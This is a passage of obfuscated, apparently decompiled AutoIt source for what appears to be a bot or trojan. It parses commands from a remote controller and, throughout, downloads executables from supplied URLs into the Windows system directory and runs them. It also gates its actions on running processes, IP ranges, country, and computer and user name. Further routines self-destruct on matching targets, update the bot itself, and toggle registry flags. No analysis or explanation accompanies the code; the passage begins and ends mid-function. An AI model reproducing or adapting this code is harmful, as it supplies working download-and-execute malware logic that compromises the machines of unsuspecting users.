			$Var0398 = StringSplit($Var02C6, "@")
			For $Var0399 = 1 To $Var0398[0]
				$Var039A = StringSplit($Var0398[$Var0399], " ")
				If $Var039A[0] = 7 Then
					$Var0385 = $Var039A[1]
					$Var0386 = $Var039A[2]
					$Var0387 = $Var039A[3]
					$Var039B = $Var039A[4]
					$Var039C = $Var039A[5]
					$Var039D = $Var039A[6]
					$Var039E = $Var039A[7]
					$Var039E = StringSplit($Var039E, "~")
					If $Var039E[0] <> 0 Then
						$Var039F = 0
						For $Var03A0 = 1 To $Var039E[0]
							If ProcessExists($Var039E[$Var03A0]) Then
								$Var039F = $Var039F + 1
							EndIf
						Next
						If RegRead($Var029A, $Var039C) = "1" Or RegRead($Var029A, $Var039C) = "error" Then
						Else
							If $Var039F = 0 Then
								Sleep(Random(0, $Var039D * 0x03E8, 1))
								InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
								If FileExists(@SystemDir & "\" & $Var0386) And FileGetVersion(@SystemDir & "\" & $Var0386) = $Var039B And FileGetSize(@SystemDir & "\" & $Var0386) = $Var0387 Then
									ShellExecute($Var0386, "", @SystemDir & "\")
									If @error Then
										RegWrite($Var029A, $Var039C, "REG_SZ", "error")
									Else
										RegWrite($Var029A, $Var039C, "REG_SZ", "1")
									EndIf
								Else
									RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
									FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
									FileDelete(@SystemDir & "\" & $Var0386)
								EndIf
							EndIf
						EndIf
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	If $Var02F3 = 1 Then
		$Var036F = StringRegExp($Var029F, "FAq9PKZr3vC6sdS4FJ8ker64V1Edf6DS54Fa6G4Kgg5Dr25", 0)
		$Var0370 = StringRegExp($Var029F, "A6SD54g984rhwhhswpd8581dsf681g6bn5146S1468d", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "FAq9PKZr3vC6sdS4FJ8ker64V1Edf6DS54Fa6G4Kgg5Dr25"
			$Var0372 = "A6SD54g984rhwhhswpd8581dsf681g6bn5146S1468d"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var03A1 = StringSplit($Var02C6, "@")
			For $Var03A2 = 1 To $Var03A1[0]
				$Var03A3 = StringSplit($Var03A1[$Var03A2], " ")
				If $Var03A3[0] = 8 Then
					$Var03A4 = $Var03A3[1]
					$Var03A5 = $Var03A3[2]
					$Var03A6 = $Var03A3[3]
					$Var03A7 = $Var03A3[4]
					$Var03A8 = $Var03A3[5]
					$Var03A9 = $Var03A3[6]
					$Var03AA = $Var03A3[7]
					$Var03AB = $Var03A3[8]
					$Var03AB = StringSplit($Var03AB, "~")
					If $Var03AB[0] <> 0 Then
						$Var03AC = "false"
						For $Var03AD = 1 To $Var03AB[0]
							If ProcessExists($Var03AB[$Var03AD]) Then
								$Var03AC = "true"
							EndIf
						Next
						If RegRead($Var029A, $Var03A8) <> "" Then
						Else
							$Var03AE = Random(1, $Var03A9, 1)
							If $Var03AC = $Var03AA Then
								If $Var03AE = 1 Or $Var03AE = 0 Then
									$Var0376 = InetGet($Var03A4, @SystemDir & "\" & $Var03A5, 1, 0)
									If $Var0376 = 0 Then
										RegWrite($Var029A, $Var03A8, "REG_SZ", "error1")
									Else
										If FileExists(@SystemDir & "\" & $Var03A5) And FileGetVersion(@SystemDir & "\" & $Var03A5) = $Var03A7 And FileGetSize(@SystemDir & "\" & $Var03A5) = $Var03A6 Then
											ShellExecute($Var03A5, "", @SystemDir & "\")
											Sleep(0x1388)
											If @error Then
												RegWrite($Var029A, $Var03A8, "REG_SZ", "error")
											Else
												RegWrite($Var029A, $Var03A8, "REG_SZ", "1")
											EndIf
										Else
											RegWrite($Var029A, $Var03A8, "REG_SZ", "error2")
											FileSetAttrib(@SystemDir & "\" & $Var03A5, "-RASH")
											FileDelete(@SystemDir & "\" & $Var03A5)
										EndIf
									EndIf
								EndIf
							EndIf
						EndIf
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	If $Var02EF = 1 Then
		$Var036F = StringRegExp($Var029F, "I9O87PKL654M3B32M9Z5XC1", 0)
		$Var0370 = StringRegExp($Var029F, "3Z2X1C9ZX51C7Z4X1CZ9X5C1", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "I9O87PKL654M3B32M9Z5XC1"
			$Var0372 = "3Z2X1C9ZX51C7Z4X1CZ9X5C1"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var0398 = StringSplit($Var02C6, "@")
			For $Var0399 = 1 To $Var0398[0]
				$Var039A = StringSplit($Var0398[$Var0399], "%")
				If $Var039A[0] = 8 Then
					$Var0385 = $Var039A[1]
					$Var0386 = $Var039A[2]
					$Var039C = $Var039A[3]
					$Var03A9 = $Var039A[4]
					$Var03AA = $Var039A[5]
					$Var03AF = $Var039A[6]
					$Var03AF = StringSplit($Var03AF, "~")
					$Var03B0 = $Var039A[7]
					$Var03B1 = $Var039A[8]
					$Var03B1 = StringSplit($Var03B1, "~")
					$Var03B2 = "false"
					If $Var03B1[0] <> 0 Then
						For $Var03AD = 1 To $Var03B1[0]
							If ProcessExists($Var03B1[$Var03AD]) Then
								$Var03B2 = "true"
							EndIf
						Next
					EndIf
					If RegRead($Var029A, $Var039C) <> "" Then
					Else
						If $Var03B2 = $Var03B0 Then
							$Var03AE = Random(1, $Var03A9, 1)
							If $Var03AE = 1 Or $Var03AE = 0 Then
								$Var029B = Fn00B7($Var02A0, $Var02A1, $Var029A, $Var02A2, $Var032F)
								If StringInStr($Var029B, "1;") Then
									$Var029B = StringSplit($Var029B, ";")
									If $Var029B[0] = 4 Or $Var029B[0] = 2 Then
										$Var029B = $Var029B[2]
									Else
										$Var029B = "ERORRENER"
									EndIf
								EndIf
								$Var03B3 = "false"
								For $Var03B4 = 1 To $Var03AF[0]
									If $Var03AF[$Var03B4] = $Var029B Then
										$Var03B3 = "true"
									EndIf
								Next
								If $Var03B3 = $Var03AA Then
									$Var0376 = InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
									If $Var0376 = 0 Then
										RegWrite($Var029A, $Var039C, "REG_SZ", "error1")
									Else
										If FileExists(@SystemDir & "\" & $Var0386) Then
											ShellExecute($Var0386, "", @SystemDir & "\")
											Sleep(0x0064)
											If @error Then
												RegWrite($Var029A, $Var039C, "REG_SZ", "error")
											Else
												RegWrite($Var029A, $Var039C, "REG_SZ", "1")
											EndIf
										Else
											FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
											FileDelete(@SystemDir & "\" & $Var0386)
											RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
										EndIf
									EndIf
								Else
									RegWrite($Var029A, $Var039C, "REG_SZ", "noneed")
								EndIf
							EndIf
						EndIf
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	If $Var02F0 = 1 Then
		$Var036F = StringRegExp($Var029F, "7w7wq8T977T7TU9I7O3UI4P4IU", 0)
		$Var0370 = StringRegExp($Var029F, "9Z9X92Bb2B92h94H4K75J5Kj5n", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "7w7wq8T977T7TU9I7O3UI4P4IU"
			$Var0372 = "9Z9X92Bb2B92h94H4K75J5Kj5n"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var0398 = StringSplit($Var02C6, "@")
			For $Var0399 = 1 To $Var0398[0]
				$Var039A = StringSplit($Var0398[$Var0399], " ")
				If $Var039A[0] = 8 Then
					$Var0385 = $Var039A[1]
					$Var0386 = $Var039A[2]
					$Var0387 = $Var039A[3]
					$Var039B = $Var039A[4]
					$Var039C = $Var039A[5]
					$Var039D = $Var039A[6]
					$Var039E = $Var039A[7]
					$Var039E = StringSplit($Var039E, "~")
					$Var03B5 = $Var039A[8]
					$Var03B5 = StringSplit($Var03B5, "~")
					If $Var039E[0] <> 0 Then
						$Var039F = 0
						For $Var03A0 = 1 To $Var039E[0]
							If ProcessExists($Var039E[$Var03A0]) Then
								$Var039F = $Var039F + 1
							EndIf
						Next
						$Var03B6 = 0
						$Var03B7 = $Var034A
						If $Var03B7 <> "-1" Then
							$Var03B7 = StringSplit($Var03B7, ".")
							If $Var03B7[0] = 4 Then
								$Var03B8 = $Var03B7[1]
								$Var03B9 = $Var03B7[2]
								$Var03BA = $Var03B7[3]
								$Var03BB = $Var03B7[4]
								For $Var03BC = 1 To $Var03B5[0]
									$Var03BD = StringSplit($Var03B5[$Var03BC], ".")
									If $Var03BD[0] = 4 Then
										$Var03BE = $Var03BD[1]
										$Var03BF = $Var03BD[2]
										$Var03C0 = $Var03BD[3]
										$Var03C1 = $Var03BD[4]
										$Var03C2 = 0
										If $Var03B8 = $Var03BE Or $Var03BE = "x" Then
											$Var03C2 = $Var03C2 + 1
										EndIf
										If $Var03B9 = $Var03BF Or $Var03BF = "x" Then
											$Var03C2 = $Var03C2 + 1
										EndIf
										If $Var03BA = $Var03C0 Or $Var03C0 = "x" Then
											$Var03C2 = $Var03C2 + 1
										EndIf
										If $Var03BB = $Var03C1 Or $Var03C1 = "x" Then
											$Var03C2 = $Var03C2 + 1
										EndIf
										If $Var03C2 = 4 Then
											$Var03B6 = $Var03B6 + 1
										EndIf
									EndIf
								Next
							EndIf
						EndIf
						If RegRead($Var029A, $Var039C) = 1 Or RegRead($Var029A, $Var039C) = "error" Then
						Else
							If $Var039F = 0 Then
								If $Var03B6 <> 0 Then
									Sleep(Random(0, $Var039D * 0x03E8, 1))
									InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
									If FileExists(@SystemDir & "\" & $Var0386) And FileGetVersion(@SystemDir & "\" & $Var0386) = $Var039B And FileGetSize(@SystemDir & "\" & $Var0386) = $Var0387 Then
										ShellExecute($Var0386, "", @SystemDir & "\")
										If @error Then
											RegWrite($Var029A, $Var039C, "REG_SZ", "error")
										Else
											RegWrite($Var029A, $Var039C, "REG_SZ", "1")
										EndIf
									Else
										FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
										FileDelete(@SystemDir & "\" & $Var0386)
										RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
									EndIf
								Else
									RegWrite($Var029A, $Var039C, "REG_SZ", "noneed")
								EndIf
							EndIf
						EndIf
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	If $Var02F5 = 1 Then
		$Var036F = StringRegExp($Var029F, "9df51gftr1h19gh650gh5j6046j540fof0o4yu540f", 0)
		$Var0370 = StringRegExp($Var029F, "gf854h1t11h1r8601t08j90sd80ew0kty0j4tyj004", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "9df51gftr1h19gh650gh5j6046j540fof0o4yu540f"
			$Var0372 = "gf854h1t11h1r8601t08j90sd80ew0kty0j4tyj004"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var0398 = StringSplit($Var02C6, "@")
			For $Var0399 = 1 To $Var0398[0]
				$Var039A = StringSplit($Var0398[$Var0399], " ")
				If $Var039A[0] = 4 Then
					$Var0385 = $Var039A[1]
					$Var0386 = $Var039A[2]
					$Var039C = $Var039A[3]
					$Var03A9 = $Var039A[4]
					If RegRead($Var029A, $Var039C) <> "" Then
					Else
						$Var03AE = Random(1, $Var03A9, 1)
						If $Var03AE = 1 Or $Var03AE = 0 Then
							If FileExists(@SystemDir & "\" & $Var0386) Then
								FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
								FileDelete(@SystemDir & "\" & $Var0386)
							EndIf
							$Var0376 = InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
							If $Var0376 = 0 Then
								RegWrite($Var029A, $Var039C, "REG_SZ", "error1")
							Else
								If FileExists(@SystemDir & "\" & $Var0386) Then
									ShellExecute($Var0386, "", @SystemDir & "\")
									Sleep(0x1388)
									If @error Then
										RegWrite($Var029A, $Var039C, "REG_SZ", "error")
									Else
										RegWrite($Var029A, $Var039C, "REG_SZ", "1")
									EndIf
								Else
									FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
									FileDelete(@SystemDir & "\" & $Var0386)
									RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
								EndIf
							EndIf
						Else
						EndIf
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	If $Var02F6 = 1 Then
		$Var036F = StringRegExp($Var029F, "981NTY81KL1DF36DRG684F0080H94ERG498NMJ4SY9", 0)
		$Var0370 = StringRegExp($Var029F, "9DFG81R0Z1XC1BVN3651OUT51QW198C47651H9581", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "981NTY81KL1DF36DRG684F0080H94ERG498NMJ4SY9"
			$Var0372 = "9DFG81R0Z1XC1BVN3651OUT51QW198C47651H9581"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var0398 = StringSplit($Var02C6, "@")
			For $Var0399 = 1 To $Var0398[0]
				$Var039A = StringSplit($Var0398[$Var0399], " ")
				If $Var039A[0] = 5 Then
					$Var0385 = $Var039A[1]
					$Var0386 = $Var039A[2]
					$Var039C = $Var039A[3]
					$Var03A9 = $Var039A[4]
					$Var03C3 = $Var039A[5]
					If RegRead($Var029A, $Var039C) <> "" Then
					Else
						$Var03AE = Random(1, $Var03A9, 1)
						If $Var03AE = 1 Or $Var03AE = 0 Then
							$Var0360 = RegRead($Var029A, "exp1")
							$Var0361 = RegRead($Var029A, "dreg")
							$Var0362 = Fn00A8(0, $Var0360, $Var032F, 4)
							$Var0363 = Fn00A8(0, $Var0361, $Var032F, 4)
							If $Var0362 * 1 + $Var03C3 <= @YDAY * 1 Or $Var0363 * 1 < @YEAR * 1 Then
								If FileExists(@SystemDir & "\" & $Var0386) Then
									FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
									FileDelete(@SystemDir & "\" & $Var0386)
								EndIf
								$Var0376 = InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
								If $Var0376 = 0 Then
									RegWrite($Var029A, $Var039C, "REG_SZ", "error1")
								Else
									If FileExists(@SystemDir & "\" & $Var0386) Then
										ShellExecute($Var0386, "", @SystemDir & "\")
										If @error Then
											RegWrite($Var029A, $Var039C, "REG_SZ", "error")
										Else
											RegWrite($Var029A, $Var039C, "REG_SZ", "1")
										EndIf
									Else
										FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
										FileDelete(@SystemDir & "\" & $Var0386)
										RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
									EndIf
								EndIf
							Else
							EndIf
						Else
						EndIf
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	If $Var02FA = 1 Then
		$Var036F = StringRegExp($Var029F, "P4A9uK3i6I4V2V2VB1JH6jjjkk", 0)
		$Var0370 = StringRegExp($Var029F, "FD8dcn654F6J465h4fg698k9l9kh654jj", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "P4A9uK3i6I4V2V2VB1JH6jjjkk"
			$Var0372 = "FD8dcn654F6J465h4fg698k9l9kh654jj"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var03C4 = StringSplit($Var02C6, "~")
			$Var03C5 = DllCall("kernel32.dll", "long", "GetTickCount")
			$Var03C6 = $Var03C5[0]
			Dim $Var03C7, $Var03C8, $Var03C9
			Fn0090($Var03C6, $Var03C7, $Var03C8, $Var03C9)
			$Var03CA = Int($Var03C7 / 0x0018)
			$Var03C7 = $Var03C7 - ($Var03CA * 0x0018)
			If $Var03C4[0] = 5 Then
				If $Var03C4[2] = "D" Then
					$Var03CB = $Var03C4[1] * 0x0018 * 0x003C * 0x003C * 0x03E8
					If $Var03CB <= $Var03C6 Then
						$Var0385 = $Var03C4[3]
						$Var0386 = $Var03C4[4]
						$Var039C = $Var03C4[5]
						If RegRead($Var029A, $Var039C) <> "" Then
						Else
							If FileExists(@SystemDir & "\" & $Var0386) Then
								FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
								FileDelete(@SystemDir & "\" & $Var0386)
							EndIf
							InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
							Sleep(0x1388)
							If FileExists(@SystemDir & "\" & $Var0386) Then
								ShellExecute($Var0386, "", @SystemDir & "\")
								Sleep(0x1388)
								If @error Then
									RegWrite($Var029A, $Var039C, "REG_SZ", "error")
								Else
									RegWrite($Var029A, $Var039C, "REG_SZ", "1")
								EndIf
							Else
								FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
								FileDelete(@SystemDir & "\" & $Var0386)
								RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
							EndIf
						EndIf
					EndIf
				EndIf
				If $Var03C4[2] = "H" Then
					$Var03CC = $Var03C4[1] * 0x003C * 0x003C * 0x03E8
					If $Var03CC <= $Var03C6 Then
						$Var0385 = $Var03C4[3]
						$Var0386 = $Var03C4[4]
						$Var039C = $Var03C4[5]
						If RegRead($Var029A, $Var039C) <> "" Then
						Else
							If FileExists(@SystemDir & "\" & $Var0386) Then
								FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
								FileDelete(@SystemDir & "\" & $Var0386)
							EndIf
							InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
							Sleep(0x1388)
							If FileExists(@SystemDir & "\" & $Var0386) Then
								ShellExecute($Var0386, "", @SystemDir & "\")
								Sleep(0x1388)
								If @error Then
									RegWrite($Var029A, $Var039C, "REG_SZ", "error")
								Else
									RegWrite($Var029A, $Var039C, "REG_SZ", "1")
								EndIf
							Else
								FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
								FileDelete(@SystemDir & "\" & $Var0386)
								RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
							EndIf
						EndIf
					EndIf
				EndIf
			Else
			EndIf
		EndIf
	EndIf
	If $Var02FB = 1 Then
		$Var036F = StringRegExp($Var029F, "9a5sd19a5s1d3g5h7j", 0)
		$Var0370 = StringRegExp($Var029F, "gf854h1t11h1r8601t08s95d1gj65ko435er7", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "9a5sd19a5s1d3g5h7j"
			$Var0372 = "gf854h1t11h1r8601t08s95d1gj65ko435er7"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var0398 = StringSplit($Var02C6, "@")
			For $Var0399 = 1 To $Var0398[0]
				$Var039A = StringSplit($Var0398[$Var0399], " ")
				If $Var039A[0] = 4 Then
					$Var0385 = $Var039A[1]
					$Var0386 = $Var039A[2]
					$Var039C = $Var039A[3]
					$Var03A9 = $Var039A[4]
					$Var03CD = RegRead($Var029A, $Var039C)
					If $Var03CD = "error" Or $Var03CD = "error2" Or $Var03CD = "error1" Or $Var03CD = "1" Then
						$Var03AE = Random(1, $Var03A9, 1)
						If $Var03AE = 1 Or $Var03AE = 0 Then
							If FileExists(@SystemDir & "\" & $Var0386) Then
								FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
								FileDelete(@SystemDir & "\" & $Var0386)
							EndIf
							$Var0376 = InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
							If $Var0376 = 0 Then
								RegWrite($Var029A, $Var039C, "REG_SZ", "error1")
							Else
								If FileExists(@SystemDir & "\" & $Var0386) Then
									ShellExecute($Var0386, "", @SystemDir & "\")
									Sleep(0x1388)
									If @error Then
										RegWrite($Var029A, $Var039C, "REG_SZ", "error")
									Else
										RegWrite($Var029A, $Var039C, "REG_SZ", "2")
									EndIf
								Else
									FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
									FileDelete(@SystemDir & "\" & $Var0386)
									RegWrite($Var029A, $Var039C, "REG_SZ", "error2")
								EndIf
							EndIf
						Else
						EndIf
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	If $Var02E8 = 1 Then
		RegWrite($Var029A, "eggol", "REG_SZ", "1")
		$Var02C5 = 1
	EndIf
	If $Var02E9 = 1 Then
		RegWrite($Var029A, "eggol", "REG_SZ", "0")
		$Var02C5 = 0
	EndIf
	If $Var02DC = 1 Then
		$Var036F = StringRegExp($Var029F, "KZ54777y", 0)
		$Var0370 = StringRegExp($Var029F, "xKw977", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "KZ54777y"
			$Var0372 = "xKw977"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var03CE = @ComputerName
			$Var03CF = @UserName
			$Var03D0 = StringSplit($Var02C6, "~")
			For $Var0350 = 1 To $Var03D0[0]
				$Var03D1 = $Var03CE & $Var03CF
				If $Var03D0[$Var0350] = $Var03D1 Then
					$Var02CA = "Harakiri"
					$Var02C8 = "killpc-name&user"
					$Var034E = $Var0331
					$Var02CB = "none"
					$Var02CC = "none"
					Fn00A6()
					Fn00A4()
					Fn00A2()
					Fn00A5()
					Fn00A1()
					Fn00A3()
					Exit
				EndIf
			Next
		EndIf
	EndIf
	If $Var02ED = 1 Then
		$Var036F = StringRegExp($Var029F, "Q7A4Z1W8S5X2E8D5C2R8F5V2", 0)
		$Var0370 = StringRegExp($Var029F, "9P6L3M8I5J2N7Y4G1V7T5J3M", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "Q7A4Z1W8S5X2E8D5C2R8F5V2"
			$Var0372 = "9P6L3M8I5J2N7Y4G1V7T5J3M"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var03D0 = StringSplit($Var02C6, "~")
			$Var03B7 = $Var034A
			If $Var03B7 <> "-1" Then
				$Var03D2 = Fn00B7($Var02A0, $Var02A1, $Var029A, $Var02A2, $Var032F)
				If StringInStr($Var03D2, "1;") Then
					$Var03D2 = StringSplit($Var03D2, ";")
					If $Var03D2[0] = 4 Or $Var03D2[0] = 2 Then
						$Var02CD = $Var03D2[2]
					EndIf
				EndIf
			EndIf
			For $Var0350 = 1 To $Var03D0[0]
				If $Var03D0[$Var0350] = $Var02CD Then
					$Var02CA = "Harakiri"
					$Var02C8 = "kill-country"
					$Var034E = $Var0331
					$Var02CB = "none"
					$Var02CC = "none"
					Fn00A6()
					Fn00A4()
					Fn00A2()
					Fn00A5()
					Fn00A1()
					Fn00A3()
					Exit
				EndIf
			Next
		EndIf
	EndIf
	If $Var02E7 = 1 Then
		$Var036F = StringRegExp($Var029F, "NN654X564BBV", 0)
		$Var0370 = StringRegExp($Var029F, "Z4N4X4M5V4C78BV", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "NN654X564BBV"
			$Var0372 = "Z4N4X4M5V4C78BV"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var03D3 = $Var034A
			If $Var03D3 = "-1" Then
			Else
				$Var03D4 = StringSplit($Var03D3, ".")
				If $Var03D4[0] = 4 Then
					$Var03D5 = StringSplit($Var02C6, "~")
					For $Var03D6 = 1 To $Var03D5[0]
						$Var03D7 = StringSplit($Var03D5[$Var03D6], ".")
						If $Var03D7[0] = 4 Then
							$Var03D8 = 0
							If $Var03D4[1] = $Var03D7[1] Or $Var03D7[1] = "x" Then
								$Var03D8 = $Var03D8 + 1
							EndIf
							If $Var03D4[2] = $Var03D7[2] Or $Var03D7[2] = "x" Then
								$Var03D8 = $Var03D8 + 1
							EndIf
							If $Var03D4[3] = $Var03D7[3] Or $Var03D7[3] = "x" Then
								$Var03D8 = $Var03D8 + 1
							EndIf
							If $Var03D4[4] = $Var03D7[4] Or $Var03D7[4] = "x" Then
								$Var03D8 = $Var03D8 + 1
							EndIf
							If $Var03D8 = 4 Then
								$Var02CA = "Harakiri"
								$Var02C8 = "Ip Remover (wan)"
								$Var034E = $Var0331
								$Var02CB = "none"
								$Var02CC = "none"
								Fn00A6()
								Fn00A4()
								Fn00A2()
								Fn00A5()
								Fn00A1()
								Fn00A3()
								Exit
							EndIf
						EndIf
					Next
				EndIf
			EndIf
		EndIf
	EndIf
	If $Var02E0 = 1 Then
		$Var036F = StringRegExp($Var029F, "U15W1s", 0)
		$Var0370 = StringRegExp($Var029F, "u15wab", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "U15W1s"
			$Var0372 = "u15wab"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var03D9 = StringSplit($Var02C6, "~")
			If $Var03D9[0] = 3 Then
				$Var0385 = $Var03D9[1]
				$Var0386 = $Var03D9[2]
				If FileGetVersion(@ScriptDir & "\" & $Var0292) = $Var03D9[3] Then
				Else
					Sleep(0x0190)
					InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
					Sleep(0x0190)
					If FileExists(@SystemDir & "\" & $Var0386) Then
						ShellExecute($Var0386, "", @SystemDir & "\")
						If @error Then
						EndIf
						Exit
					EndIf
				EndIf
			EndIf
		EndIf
	EndIf
	If $Var02E4 = 1 Then
		$Var036F = StringRegExp($Var029F, "N45ASDY4", 0)
		$Var0370 = StringRegExp($Var029F, "N7DK651O", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "N45ASDY4"
			$Var0372 = "N7DK651O"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var03DA = StringSplit($Var02C6, "@")
			For $Var03DB = 1 To $Var03DA[0]
				$Var03DC = StringSplit($Var03DA[$Var03DB], "~")
				If $Var03DC[0] = 5 Then
					For $Var03DD = 1 To $Var03DC[0]
					Next
					$Var0385 = $Var03DC[1]
					$Var0386 = $Var03DC[2]
					$Var03DE = $Var03DC[3]
					$Var0387 = $Var03DC[4]
					$Var039B = $Var03DC[5]
					If $Var03DE = @ComputerName & @UserName Then
						If FileExists(@SystemDir & "\" & $Var0386) And FileGetVersion(@SystemDir & "\" & $Var0386) = $Var039B And FileGetSize(@SystemDir & "\" & $Var0386) = $Var0387 Then
						Else
							FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
							FileDelete(@SystemDir & "\" & $Var0386)
							Sleep(0x0190)
							InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
							Sleep(0x0190)
							If FileExists(@SystemDir & "\" & $Var0386) And FileGetVersion(@SystemDir & "\" & $Var0386) = $Var039B And FileGetSize(@SystemDir & "\" & $Var0386) = $Var0387 Then
								ShellExecute($Var0386, "", @SystemDir & "\")
								If @error Then
								EndIf
							EndIf
						EndIf
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	If $Var02D5 = 1 Then
		RegWrite($Var029A, "a", "REG_SZ", "1")
		$Var02D1 = 1
	EndIf
	If $Var02D3 = 1 Then
		RegWrite($Var029A, "a", "REG_SZ", "0")
		$Var02D1 = 0
	EndIf
	If $Var02D6 = 1 Then
		RegWrite($Var029A, "b", "REG_SZ", "1")
		$Var02D2 = 1
	EndIf
	If $Var02D4 = 1 Then
		RegWrite($Var029A, "b", "REG_SZ", "0")
		$Var02D2 = 0
	EndIf
	If $Var02B0 = 1 Then
		$Var036F = StringRegExp($Var029F, "llLLLGS436QWE6ZC654E6546FFSS9d8h7t", 0)
		$Var0370 = StringRegExp($Var029F, "Adgf45rwKJK87H883210BHhBH05BGFnbvg", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "llLLLGS436QWE6ZC654E6546FFSS9d8h7t"
			$Var0372 = "Adgf45rwKJK87H883210BHhBH05BGFnbvg"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var03DF = StringSplit($Var02C6, "~")
			For $Var03E0 = 1 To $Var03DF[0]
				If ProcessExists($Var03DF[$Var03E0]) Then
					RegWrite($Var029A, "a", "REG_SZ", "1")
					$Var02D1 = 1
					RegWrite($Var029A, "b", "REG_SZ", "1")
					$Var02D2 = 1
				EndIf
			Next
		EndIf
	EndIf
	If $Var02EA = 1 Then
		$Var036F = StringRegExp($Var029F, "D7G445SdxFDC", 0)
		$Var0370 = StringRegExp($Var029F, "KzDLzS5c47zSDN", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "D7G445SdxFDC"
			$Var0372 = "KzDLzS5c47zSDN"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var03E1 = StringSplit($Var02C6, "~")
			For $Var03E2 = 1 To $Var03E1[0]
				$Var03E3 = $Var03E1[$Var03E2]
				$Var03E3 = StringSplit($Var03E3, ".")
				If $Var03E3[0] = 2 Then
					$Var03E4 = StringSplit(@IPAddress1, ".")
					If $Var03E4[0] = 4 Then
						If $Var03E3[1] = $Var03E4[1] And $Var03E3[2] = $Var03E4[2] Then
							$Var02D8 = 2
							$Var034C = @IPAddress1
							$Var034D = StringSplit($Var034C, ".")
							If $Var034D[0] = 4 Then
								$Var02B5 = $Var034D[1]
								$Var02B6 = $Var034D[2]
								$Var02B7 = $Var034D[3]
								$Var02B8 = 0
							EndIf
						EndIf
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	Fn00B3()
	If $Var02CE = 0 Then
		$Var02CE = 1
		If $Var02E2 = 1 Then
			$Var036F = StringRegExp($Var029F, "V8e74y", 0)
			$Var0370 = StringRegExp($Var029F, "Psj45a7scl", 0)
			If $Var036F = 1 And $Var0370 = 1 Then
				$Var0371 = "V8e74y"
				$Var0372 = "Psj45a7scl"
				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
				$Var03E5 = StringSplit($Var02C6, "~")
				If $Var03E5[0] = 2 Then
					$Var03E6 = StringSplit($Var03E5[1], ".")
					If $Var03E6[0] = 4 Then
						$Var02B1 = $Var03E6[1]
						$Var02B2 = $Var03E6[2]
						$Var02B3 = $Var03E6[3]
						$Var02B4 = 0
						If StringInStr($Var03E5[2], "a") Then
